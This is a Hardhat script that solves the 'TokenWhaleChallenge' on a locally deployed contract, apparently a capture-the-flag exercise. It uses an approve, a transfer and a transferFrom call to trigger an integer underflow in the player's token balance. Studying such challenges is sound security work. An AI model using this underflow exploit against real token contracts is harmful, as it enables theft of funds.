import { ethers } from "hardhat";

async function main() {
  // two signer accounts
  const accounts = await ethers.getSigners();
  const [player, friend] = accounts.slice(0, 2);

  // deploy contract
  const factory = await ethers.getContractFactory("TokenWhaleChallenge");
  const contract = await factory.deploy(player.address);
  await contract.waitForDeployment();

  // signed by friend, approve an amount from the friend account to the player account
  const approve = await contract.connect(friend).approve(player.address, 1000);
  await approve.wait();

  // signed by player, transfer an amount from the player account to the friend account
  const transfer = await contract.connect(player).transfer(friend.address, 501);
  await transfer.wait();

  // signed by player account, transfer an amount from the friend account to the friend account
  const overTransfer = await contract
    .connect(player)
    .transferFrom(friend.address, friend.address, 500);
  await overTransfer.wait();

  const isComplete = await contract.isComplete();
  console.log(isComplete);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
